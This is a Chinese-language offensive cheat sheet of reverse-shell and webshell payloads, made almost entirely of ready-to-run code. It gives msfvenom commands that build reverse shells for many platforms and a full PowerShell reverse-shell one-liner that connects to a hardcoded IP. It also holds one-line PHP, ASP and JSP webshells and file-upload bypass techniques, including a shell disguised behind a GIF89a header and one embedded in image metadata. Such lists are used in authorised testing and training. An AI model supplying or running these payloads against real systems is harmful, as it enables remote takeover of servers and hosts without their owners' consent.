### 反向shell
#### Linux - MSFVenom
~~~

msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
~~~
#### Windows - MSFVenom
~~~

msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
~~~
#### Powershell
~~~

powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.194',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
~~~
#### ASP
~~~

msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
~~~
#### ASPX
~~~

msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
~~~
#### JSP
~~~

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
~~~
#### WAR
~~~


msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
~~~
#### PHP
~~~

msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
~~~
#### HTA
~~~

msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell.hta
~~~
#### DLL
~~~

msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
~~~
#### 反向shell在线生成
~~~

https://weibell.github.io/reverse-shell-generator/
~~~
### 简单的webshell
#### PHP
~~~

<?php echo passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
~~~
#### ASP
~~~

<% eval request("cmd") %>
~~~
#### JSP
~~~

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
~~~
### 文件上传绕过
#### 后缀拓展
~~~

PHP: phtml, .php, .php3, .php4, .php5, and .inc

ASP: asp, .aspx

PERL: .pl, .pm, .cgi, .lib

JSP: .jsp, .jspx, .jsw, .jsv, and .jspf

Coldfusion: .cfm, .cfml, .cfc, .dbm
~~~
#### 使用GIF89a
~~~

GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
~~~
#### 图片中包含shell
~~~

exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
~~~
